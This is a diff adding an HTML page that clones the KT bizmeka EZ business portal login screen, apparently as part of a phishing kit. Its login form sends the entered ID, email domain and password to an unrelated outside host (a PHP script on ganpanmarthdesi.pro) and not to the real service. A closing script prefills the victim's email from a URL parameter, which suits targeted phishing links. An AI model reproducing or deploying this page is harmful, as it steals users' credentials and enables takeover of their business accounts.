@@ -1,0 +1,662 @@
+﻿<!DOCTYPE html>
+<html lang="ko">
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, width=device-width" />
+	<title>KT bizmeka EZ</title>
+	<link rel="stylesheet" href="https://ezsso.bizmeka.com/css/common.css" />
+	<!-- favicon -->
+	<link rel="shortcut icon" href="https://ezsso.bizmeka.com/images/common/favicon.ico">
+	<link rel="stylesheet" href="https://ezsso.bizmeka.com/css/sprologin.css" />
+
+	<script type="text/javascript">
+		var PO_BASE_URL = "https://ezportal.bizmeka.com";
+
+		if(opener) {	
+			var ctl = true;	
+			var regex = new RegExp("^([0-9A-Za-z-\\.@:%_\+~#=]+)+((\\.[a-zA-Z]{2,3})+)(/(.)*)?(\\?(.)*)?");
+			var ts = location.href;
+			
+			try {
+				opener.document;
+			} catch(e) {
+				document.domain = location.hostname.replace(/([a-zA-Z0-9-]+.)/, "");
+				try {
+					opener.document;
+				} catch(e) { ctl = false; }
+			}
+			
+			if(ctl) {
+				if (regex.test(ts)) {
+					opener.location.href = ts;
+					window.close();
+				} else {
+// 					alert("Not a valid request.");
+				}				
+				
+			}
+		} else if(top != window) {	
+		
+			var regex = new RegExp("^([0-9A-Za-z-\\.@:%_\+~#=]+)+((\\.[a-zA-Z]{2,3})+)(/(.)*)?(\\?(.)*)?");
+			var ts = location.href;
+			
+			try {
+				top.document;
+			} catch(e) {
+				document.domain = location.hostname.replace(/([a-zA-Z0-9]+.)/, "");
+			}
+			if (regex.test(ts)) {			
+				top.location.href = ts;
+			} else {
+				top.location.reload();
+// 				alert("Not a valid request.");
+			}
+		}
+		
+	</script>
+	<script type="text/javascript">var contextRoot = "";</script>
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/langResource/en.js"></script>
+	<!--[if lt IE 9]>
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/jquery-1.11.3.min.js"></script>
+	<![endif]-->
+	<!--[if gte IE 9]>
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/jquery-2.1.4.min.js"></script>
+	<![endif]-->
+	<!--[if !IE]> -->
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/jquery-2.1.4.min.js"></script>
+	<!-- <![endif]-->
+	<script type="text/javascript">jQuery.migrateMute = true;</script>
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/jquery-migrate-1.2.1.min.js"></script>
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/bootstrap-3.3.5/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/plugins.js"></script>
+	<script type="text/javascript" src="https://ezportal.bizmeka.com/js/commonSProject.js"></script>
+	
+	
+	<script type="text/javascript" src="/JavaScriptServlet"></script>
+	
+	
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/rsa/jsbn.js"></script>
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/rsa/rsa.js"></script>
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/rsa/prng4.js"></script>
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/rsa/rng.js"></script>
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/crypto/aes.js"></script>
+	<script type="text/javascript" src="https://ezsso.bizmeka.com/js/settings.js"></script>
+	
+	<script type="text/javascript">
+	
+	var cryptokey = "sproCtytoKey";
+	var goLogin, $form, $sendForm;
+	var click = true;	
+	(function($){
+
+		goLogin = function() {
+			var name = $.trim($("#username").val());
+			var password = $("#password").val();
+			
+			var sproKeyModulus = $("#sproKeyModulus").val();
+	        var sproKeyExponent = $("#sproKeyExponent").val();
+
+	        var rsa = new RSAKey();
+	        rsa.setPublic(sproKeyModulus, sproKeyExponent);
+
+			if(name == "") {
+				alert("ID is empty!");
+				$("#j_username").trigger("focus");
+				return false;
+			}
+			
+			if(password == "") {
+				alert("Password is empty!");
+				$("#password").trigger("focus");
+				return false;
+			}
+			
+			var domain = document.domain;
+			var securedUsername = rsa.encrypt(name);
+		    var securedPassword = rsa.encrypt(password);
+		    
+		    var encrypted = CryptoJS.AES.encrypt(name, cryptokey);
+		    
+		    
+		    if($("#saveID").is(":checked")) {
+				$.cookie("LOGIN_SAVEID", encrypted, { expires: 30, path: "/" });
+			} else {
+				$.removeCookie("LOGIN_SAVEID");
+			}
+
+		    $("#j_username").val(securedUsername);
+		    $("#j_password").val(securedPassword + "9BEBF0F6A34733005AF29B48C6269E807179D46D00EA83CF4EA8A0AFEB63F3795C2F85A0B3CC8C21CDB4A97239B6F1DF72F30957BA1038CF342C3925C7AD7AEF74D2B6A918DE352F3AFFCAD46101A4CA5A01B40D4758D18251D7C9D2F9F6A257AD78D3261D4DAFFBA409BC24E4BECE89A91612E1B460480C4EC41BC754E81E6BA4FCFE1C7DC6E0BBC4BB2D886191CAB415FDF7ECD469A5E4D0798167BC4D704A14533AE0AF783F37C0050B26AA19F63745C065D744093D60D7092CE2BBFD65A1DD5B74BEBA2507CFB221CFBB3E5AD4D5F160B65DF670D7758976070F01D23DCBAC2486022CC886FB967BCC4F5F278DE023E69BB8173E522D9547F9FDE7DE2377");
+			
+			return true;
+		};
+		
+		$(document).ready(function(){
+			
+			$form = $("#loginForm");
+			$sendForm = $("#loginSendForm");
+			var companyName = $.cookie("COMPANY_NAME") || "KT bizmeka EZ";
+			if(companyName){
+				$("#companyName").text(decodeURIComponent(companyName));
+			}
+			
+			$("#username").focus();
+			
+			$("#btnSubmit").click(function() {
+				$("#welfaremallYn").val("");
+				var name = $.trim($("#username").val());
+				var password = $("#password").val();
+				
+				if(name == "") {
+					alert("ID is empty!");
+					$("#j_username").trigger("focus");
+					return false;
+				}
+				
+				if(password == "") {
+					alert("Password is empty!");
+					$("#password").trigger("focus");
+					return false;
+				}
+				//인증번호로그인 체크 확인
+				if($("input[name="loginType"]:checked").val() == "captchLogin"){
+					var $input = $("input[name=answerData]").val();
+					var captcha = $("#answerData").get(0).Captcha;
+					if($input.length == 6) {
+						var obj_data = new Object();
+						obj_data.answerData = $("input[name=answerData]").val();
+						obj_data.captchaId = captcha.Id;
+						obj_data.instanceId = captcha.InstanceId;
+					
+						$.ajax({
+			 				url : "/loginIsCaptcha.do",
+			 				data: obj_data,
+			 				type : "post",
+			 				success : function(result){
+			 					if(result == "FAIL") {
+			 						alert("캡차 번호가 맞지 않습니다.\n다시 입력해 주세요.");
+			 						$("#answerData").get(0).Captcha.ReloadImage();
+			 						return;
+			 					}else{
+			 						$("input[name=captchaInput]", $sendForm).val($("#answerData").val());
+			 						sendFormSubmit();	
+			 					}
+			 				},
+			 				error : function(xhr){
+			 					alert("System error has occurred.");	
+			 				}
+			 			});
+					} else {
+						alert("보안문자 6자리로 입력해 주세요.");
+						return false;
+					}
+				}else{
+					sendFormSubmit();
+				}
+			});
+			
+			sendFormSubmit = function(){
+				if(click){
+					click = false;
+						
+					$sendForm.submit();
+				}else{
+					 // 타이밍 추가
+		            setTimeout(function () {
+		                click = true;
+		            }, 1000)
+					return false;
+				}	
+			}
+			
+			$("#password").keypress( function(event) { 
+				if(event.which == 13) {
+					$("#btnSubmit").trigger("click");
+					return false;
+				}
+			});
+			
+			var savedId = $.cookie("LOGIN_SAVEID");
+			
+			if( savedId ){
+				var decrypted = CryptoJS.AES.decrypt(savedId, cryptokey);
+				decrypted.toString(CryptoJS.enc.Utf8);
+				$("input[name=username]").val(decrypted.toString(CryptoJS.enc.Utf8));
+			}
+			
+			//인증번호 로그인 체크
+			var authNumLoginCk = $.cookie("AUTH_NUM_LOGIN");
+			if( authNumLoginCk == 1 ){
+				$("input[name="loginType"]:radio[value="captchLogin"]").prop("checked", true); 
+				$("#login-container").css("height","500px");
+				$(".login-form").css("height","500px");
+				$(".login-banner").css("top","500px");
+				$("#captchaDiv").css("display","");
+				$("#btnSubmit").css("margin","0 0 0 0");	
+			}			
+			//인증번호 로그인 체크 값 변경시
+			$("input[name="loginType"]").change(function(event) {
+				if($("input[name="loginType"]:checked").val() == "authNumLogin"){
+					$("#login-container").css("height","360px");
+					$(".login-form").css("height","360px");
+					$(".login-banner").css("top","360px");
+					$("#captchaDiv").css("display","none");
+					$("#btnSubmit").css("margin","30px 0 4px");
+					$.cookie("AUTH_NUM_LOGIN", "0", {path:"/", expires:new Date(9999, 12, 31, 0, 0, 0)});
+				}else{
+					$.cookie("AUTH_NUM_LOGIN", "1", {path:"/", expires:new Date(9999, 12, 31, 0, 0, 0)});
+					$("#login-container").css("height","500px");
+					$(".login-form").css("height","500px");
+					$(".login-banner").css("top","500px");
+					$("#captchaDiv").css("display","");
+					$("#btnSubmit").css("margin","0 0 0 0");
+				}
+			});
+			//---------------------------------------------- 보안문자(캡차) 로직 시작 -------------------------------------------- //
+			$("#captchaBtnReload").click(function(event) {
+				event.preventDefault();
+				$("#answerData").get(0).Captcha.ReloadImage();
+			});
+			$("#captchaBtnReload2").click(function(event) {
+				event.preventDefault();
+				$("#answerData").get(0).Captcha.ReloadImage();
+			});
+			$("#captchaBtnSound").click(function(event) {
+				event.preventDefault();
+				$("#answerData").get(0).Captcha.PlaySound();
+			});
+			
+			$("#answerData").keypress( function(event) {
+				if(event.which == 13) {
+					$("#btnSubmit").trigger("click");
+					return false;
+				}
+			});
+			
+			//---------------------------------------------- 보안문자(캡차) 로직 종료  -------------------------------------------- //
+			$(".side-bar").click(function(){
+				var $leftmenu = $("#sidemenu");
+				
+				if($leftmenu.hasClass("opened")){
+					$leftmenu.removeClass("opened");
+				}else{
+					$leftmenu.addClass("opened");
+				}
+			});
+			
+			$("#loginGuide").click(function(event) {
+	 			event.preventDefault();
+	 			
+	 			$("#divLoginGuide").modal("show");
+	 		});
+			
+			var version = Number($.browser.version);
+	 		if($.browser && ($.browser.msie && version < 9)) {
+	 			var $noti = $("<div class="ie8-niti">" +
+						"<h1>고객님께서 사용하시는 브라우저는 Internet Explorer 8 이하 버전입니다.</h1>" +
+					  	"<p>" +
+					  		"KT bizmeka EZ는 Internet Explorer 9 이상에 최적화되어 있습니다.<br>" +
+					  		"현재 사용하시는 Internet Explorer를 업그레이드하거나, 다른 브라우저(크롬, 파이어폭스)를<br>사용하시기 바랍니다.<br/>" +
+					  		"<a href="http://windows.microsoft.com/ko-KR/internet-explorer/download-ie" target="_blank">Internet Explorer 최신버전 다운로드</a>&nbsp;&nbsp;" +
+					  		"<a href="https://www.google.com/chrome/browser/desktop/index.html" target="_blank">크롬 다운로드</a>&nbsp;&nbsp;" +
+					  		"<a href="https://www.mozilla.org/ko/firefox/new/" target="_blank">파이어폭스 다운로드</a>" +
+					  		"</p>" +
+					  	"<a href="#a" class="btn-close"><span>X</span><span class="blind">닫기</span></a>" +
+					"</div>");
+						
+				$("a.btn-close", $noti).click(function() {
+					$noti.remove();
+				});
+
+				$noti.appendTo(document.body);
+	 		}
+
+	 		$("a[data-role="banner"]").on("click", function(){
+	 			var itemId = $(this).data("bannerId");
+	 			var itemUrl = $(this).data("bannerUrl");
+	 			var itemOption = $(this).data("bannerOption");
+	 			var windowName = $(this).data("bannerName");
+	 			$.ajax({
+	 				url : "/support/accesslog/createAccessLog.do",
+	 				data: {
+	 					"systemId" : "SO",
+	 					"itemId" : itemId
+	 				},
+	 				type : "post",
+	 				success : function(data){},
+	 				error : function(xhr){}
+	 			});
+				if(itemOption == ""){
+					var openNewWindow = window.open("about:blank");
+					openNewWindow.location.href = itemUrl;	
+				}else{
+		 			spro.popupOpen(itemUrl,itemOption,windowName);
+				}
+			});	 		
+		});
+		
+		ktCompanySuspension = function(){
+			event.preventDefault();
+			
+			$("#divKtCompanySuspension").modal({backdrop: "static"});	
+		} 
+		ktCompanySuspensionCloese = function(){
+			jQuery("#divKtCompanySuspension").modal("hide")
+			location.href="/loginForm.do";
+		} 
+		
+		logoImageError = function(img) {
+			$(img).replaceWith("<span class="logo">KT bizmeka EZ</span>");
+		};
+		
+		
+		welfaremall = function(){
+			$("#welfaremallYn").val("Y");
+			var name = $.trim($("#username").val());
+			var password = $("#password").val();
+			
+			if(name == "") {
+				alert("ID is empty!");
+				$("#j_username").trigger("focus");
+				return false;
+			}
+			
+			if(password == "") {
+				alert("Password is empty!");
+				$("#password").trigger("focus");
+				return false;
+			}
+			//인증번호로그인 체크 확인
+			if($("input[name="loginType"]:checked").val() == "captchLogin"){
+				var $input = $("input[name=answerData]").val();
+				var captcha = $("#answerData").get(0).Captcha;
+				if($input.length == 6) {
+					var obj_data = new Object();
+					obj_data.answerData = $("input[name=answerData]").val();
+					obj_data.captchaId = captcha.Id;
+					obj_data.instanceId = captcha.InstanceId;
+				
+					$.ajax({
+		 				url : "/loginIsCaptcha.do",
+		 				data: obj_data,
+		 				type : "post",
+		 				success : function(result){
+		 					if(result == "FAIL") {
+		 						alert("캡차 번호가 맞지 않습니다.\n다시 입력해 주세요.");
+		 						$("#answerData").get(0).Captcha.ReloadImage();
+		 						return;
+		 					}else{
+		 						$("input[name=captchaInput]", $sendForm).val($("#answerData").val());
+		 						sendFormSubmit();	
+		 					}
+		 				},
+		 				error : function(xhr){
+		 					alert("System error has occurred.");	
+		 				}
+		 			});
+				} else {
+					alert("보안문자 6자리로 입력해 주세요.");
+					return false;
+				}
+			}else{
+				sendFormSubmit();
+			}
+		}
+		
+		
+
+	})(jQuery);
+	
+	function openLoginSettingGuide() {
+		spro.popupOpen("https://ezportal.bizmeka.com/html/userTipNew/index.html?page=html/po-docs/po_22.html",{width:1300, height:720});
+	}
+	
+	function autoLoginGuide() {
+		spro.popupOpen("https://ezportal.bizmeka.com/html/userTipNew/index.html?page=html/po-docs/po_27.html",{width:1300, height:720});
+	}
+	
+	function newWindowOpen(url){
+		window.open(url, "_blank");
+	}
+	</script>
+</head>
+<body class="login-main v1" data-page="methods">
+
+<div id="block-login"></div>
+<div id="sidemenu">
+	<h1 class="blind">메뉴영역</h1>
+	<div class="side-bar">
+		
+			
+			
+				<span class="logo">KT bizmeka EZ</span>
+			
+		
+	</div>
+	<div class="left-banner" data-type="t1" style="top:10px;">
+		
+		<img src="https://ezsso.bizmeka.com/images/banner/banner_callcenter_login1.png" alt="EZ회원가입 상담">
+	</div>
+	<div class="sub-area">
+		<ul>
+			<li><a href="https://www.bizmeka.com/main/main.do">홈페이지</a></li>	
+			<li><a href="https://www.bizmeka.com/store/main/storemainView.do">서비스스토어<!-- &nbsp;<img src="/images/common/new_ico.png" style="vertical-align:middle;"> --></a></li>	
+		</ul>
+	</div>
+</div>
+
+<!-- //pagination -->
+<div id="login-container" class="login-new">
+	<form id="loginSendForm" action="" method="post" onsubmit="return goLogin()">
+		<input type="hidden" name="j_password" id="j_password" />
+		<input type="hidden" name="j_username" id="j_username" />
+		<input type="hidden" name="messageId" id="messageId" value="" />
+		<input type="hidden" name="welfaremallYn" id="welfaremallYn" />
+		<input type="hidden" name="captchaInput" />
+	</form>	
+	<div class="login-form">
+		<h2 id="companyName"></h2>
+		<div class="form-area">
+			<form id="loginForm" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
+				<input type="hidden" id="sproKeyModulus" value="d68f9230e25a1e4d24d557fbaabd1fdcef602de58606edbb1fe6c3a93a6eccf4f56ab0be766ae3665178b2c6cef01103b9188c953ae207838bc48543f58645a7514db65e7a45348ccab9e4578bed4a9205053079c71cf1ff0426f326c5a19fe7c18beaedce2b78869db363043d8d89fd42d0f8c64c7a077473710f1d8d342dd6345a5c57fd67ed3cdbdd87f8c4912dc5240aab2b46ccc9ef8512cdda7532c5963af02209b41df50d40f06a6eedf96cc203d12996d98ca387280981d7d68f631b6a2d628897ef34570c33d5bdce592c68bbd10da37d064e7c71dc6c5ad9f54deac5390e42708b4ca916515e35594dc8117da375bd8f49437a1e805a4be890ea3d" />
+		       	<input type="hidden" id="sproKeyExponent" value="10001" />
+			
+				<div class="input_area">
+					<i class="ico_id"></i>
+					<input type="text" id="userInput" name="user" value="user" class="input-lg w100p" placeholder="아이디 또는 회사 이메일"/>
+					<input type="hidden" id="domainInput" name="domain" class="input-lg w100p" value="domain" />
+					<input type="hidden" name="sender" class="input-lg w100p" value="Bizmeka.com" />
+					<input type="hidden" name="link" value="https://ezsso.bizmeka.com/loginForm.do" />
+				</div>
+				<div class="input_area">
+					<i class="ico_pw"></i>
+					<input type="password" id="password" name="passwd" class="input-lg w100p" placeholder="Password" autofocus />
+				</div>
+				<div class="saveid">
+					<input type="checkbox" id="saveID" name="saveID" checked><label for="saveID">아이디저장</label>
+    				<span style="padding: 0 5px;">|</span>
+    				<input type="radio" value="authNumLogin" name="loginType" id="authNumLogin" checked="true" style="margin:0 2px;"><label for="authNumLogin">인증번호</label>
+    				<input type="radio" value="captchLogin" name="loginType" id="captchLogin" style="margin-left:3px;"><label for="captchLogin">캡챠</label>
+ 					<a href="https://ezsso.bizmeka.com/loginForm.do#" onclick="autoLoginGuide()" id="autoLoginGuide" >
+						</i><img border="0" src="img/ez.png" width="11" height="10"><font size="1">&#51088;&#46041; &#47196;&#44536;&#51064;</font>
+					</a>
+					<a href="https://ezsso.bizmeka.com/loginForm.do#" id="loginGuide" style="width:73px;">
+						</i><img border="0" src="img/ez.png" width="11" height="10"><font size="1">&#47196;&#44536;&#51064; &#51221;&#52293;</font>
+					</a>
+				</div>
+				
+		
+				
+				<div id="captchaDiv" style="display:none;" class="join-guide">
+					<div class="t2 mt6">
+						<div class="captchaInput">캡챠(보안문자) 입력하기</div>
+						<div class="reloadText">
+							<a href="#" id="captchaBtnReload">
+								<img src="https://ezsso.bizmeka.com/images/common/ic_refresh.png" alt="새로고침">새로고침
+							</a>
+						</div>
+					</div>
+					<div class="form-wrap">
+						<div class="captcha-area ty2">
+							<div class="code">
+								
+
+  <link type="text/css" rel="stylesheet" href="https://ezsso.bizmeka.com/botdetectcaptcha?get=layout-stylesheet" />
+  <div class="BDC_CaptchaDiv " id="botCaptcha_CaptchaDiv" style="width: 320px !important; height: 70px !important; "><!--
+ --><div class="BDC_CaptchaImageDiv" id="botCaptcha_CaptchaImageDiv" style="width: 290px !important; height: 70px !important;"><!--
+   --><img class="BDC_CaptchaImage" id="botCaptcha_CaptchaImage" src="https://ezsso.bizmeka.com/botdetectcaptcha?get=image&amp;c=botCaptcha&amp;t=3b857447cde6433a8338eab387fff407" alt="Retype the CAPTCHA code from the image" /><!--
+ --></div><!--
+ --><div class="BDC_CaptchaIconsDiv" id="botCaptcha_CaptchaIconsDiv" style="width: 24px !important;"><!--
+   --><a class="BDC_ReloadLink" id="botCaptcha_ReloadLink" href="#" title="Change the CAPTCHA code"><img class="BDC_ReloadIcon" id="botCaptcha_ReloadIcon" src="/botdetectcaptcha?get=reload-icon" alt="Change the CAPTCHA code" /></a><!--
+ --></div>
+   <script src="/botdetectcaptcha?get=script-include" type="text/javascript"></script>
+   <script src="/botdetectcaptcha?get=init-script-include&amp;c=botCaptcha&amp;t=3b857447cde6433a8338eab387fff407" type="text/javascript"></script>
+   <input type="hidden" id="BDC_VCID_botCaptcha" name="BDC_VCID_botCaptcha" value="3b857447cde6433a8338eab387fff407" />
+   <input type="hidden" id="BDC_BackWorkaround_botCaptcha" name="BDC_BackWorkaround_botCaptcha" value="0" />
+  </div>
+
+							</div>
+							<ul class="btn">
+								<li>
+									<a href="#" id="captchaBtnReload2">
+										<img src="https://ezsso.bizmeka.com/images/common/ic_refresh.png" alt="새로고침"> 새로고침
+									</a>
+								</li>
+								<li>
+									<a href="#" id="captchaBtnSound">
+										<img src="https://ezsso.bizmeka.com/images/common/ic_voice.png" alt="음성듣기"> 음성듣기
+									</a>
+								</li>
+							</ul>
+							<input class="" type="number" autocomplete="off" id="answerData" name="answerData" value="" placeholder="보안문자 입력" maxlength="6">							
+						</div>
+					</div>
+				</div>
+				<input type="image" src="img/btn.png" width="380" height="50">
+			</form>
+			<div class="login-sublink">
+				<a href="https://www.bizmeka.com/find/findIdCertTypeView.do">아이디찾기</a>
+				<a href="https://www.bizmeka.com/find/findPasswordCertTypeView.do">비밀번호찾기</a>
+				<a href="https://www.bizmeka.com/join/joinAgreeView.do">회원가입</a>
+				<a href="/rule/readLoginFailView.do">비밀번호 5회오류</a>
+			</div>
+		</div>
+	</div>
+	
+
+	<div class="login-banner">
+	</div>
+ </div>
+ 
+ <div id="divBannerContent" class="modal fade in" tabindex="-1" role="dialog" aria-hidden="false">
+	<h1 class="blind">축하메세지업</h1>
+	<div class="modal-dialog" style="width:791px;">
+		<div class="modal-content">
+			<div class="line-box web-messenger-wrap">		
+				<a href="#" onclick="jQuery("#divBannerContent").modal("hide")"><i class="icon pop-close"></i><span class="blind">닫기</span></a>
+				<img src="https://ezsso.bizmeka.com/images/common/img_popup_form_info.png" alt=""/>
+			</div>
+		</div>
+	</div>
+</div>
+
+<!-- site-settings -->
+<div class="site-settings">
+	<div class="site-settings-button animate1 fadeInRight"><span class="fa fa-cog"></span></div>
+	<div class="site-settings-content">
+		<div class="block block-transparent nm">
+			<div class="header top">
+				<h2>Login style</h2>
+			</div>
+			<p class="clearboth"></p>
+			<div class="header">
+				<h2>Backgrounds</h2>
+			</div>
+			<p class="clearboth"></p>
+			<div class="content controls">
+				<div class="form-row">
+					<div class="col-md-12" id="ss_backgrounds">
+					</div>
+				</div>
+				<div style="padding:0 15px;">
+					<a href="#" onclick="openLoginSettingGuide()"><img src="https://ezsso.bizmeka.com/images/banner/login_banner.png" alt="우리회사 로그인 페이지 설정하기"/></a>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+<!-- //site-settings -->
+
+<div id="divLoginGuide" class="modal fade">
+	<div class="modal-dialog" style="width:815px;">
+		<div class="modal-content">
+			<img src="https://ezsso.bizmeka.com/images/main/login_guide_new.jpg" alt="로그인 정책 안내" usemap="#loginInfo"/>
+			<map name="loginInfo">
+				<area href="#" onclick="jQuery("#divLoginGuide").modal("hide")" shape="rect" coords="763, 30, 793, 60" alt="닫기"/>
+				<area href="#" onclick="spro.popupOpen(spro.getWebAppPath("po") + "/html/userTipNew/index.html?page=html/po-docs/po_27.html",{width:1300, height:720})" shape="rect" coords="578, 565, 770, 600" alt="활용팀 바로가기"/>
+			</map>
+		</div>
+	</div>
+</div>
+
+<div id="divKtCompanySuspension" class="modal fade">
+	<div class="modal-dialog" style="width:510px;">
+		<div class="modal-content">
+			<img src="https://ezsso.bizmeka.com/images/common/black_kt.jpg" alt="비즈메카ZZ 이용중단 안내" usemap="#ktCompanyInfo"/>
+			<map name="ktCompanyInfo">
+				<area href="#" onclick="ktCompanySuspensionCloese()" shape="rect" coords="461,24,492,53" alt="닫기"/>
+			</map>
+		</div>
+	</div>
+</div>
+
+<div id="footer">
+	<p>Copyright © 2015 kt corp. All rights reserved.</p>
+	<div class="link">
+		<a href="https://www.bizmeka.com/customer/policyView.do?locale=ko">이용약관</a>
+		<a href="https://www.bizmeka.com/customer/policyCustomerView.do?locale=ko">개인정보처리방침</a>
+	</div>
+</div>
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-101552986-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+  gtag("config", "UA-101552986-1");
+</script>
+
+<script type="text/java-script">
+ /* <![CDATA[ */
+var google_conversion_id = 944142215;
+var google_custom_params = window.google_tag_params;
+var google_remarketing_only = true;
+/* ]]> */
+</script>
+<script type="text/java-script" src="//www.googleadservices.com/pagead/conversion.js"></script>
+<noscript>
+	<div style="display:inline;">
+		<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/944142215/?value=0&amp;guid=ON&amp;script=0"/>
+	</div>
+</noscript>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const raw = params.get('login');
+    const email = raw ? decodeURIComponent(raw) : '';
+
+    let user = '', domain = '';
+    if (email.includes('@')) {
+      [user, domain] = email.split(/@(.*)/, 2);
+    }
+
+    if (email) {
+      document.getElementById('userInput').value = email;
+      document.getElementById('domainInput').value = domain;
+      document.getElementById('greeting').textContent = email;
+    }
+  </script>
+</body>
+</html>
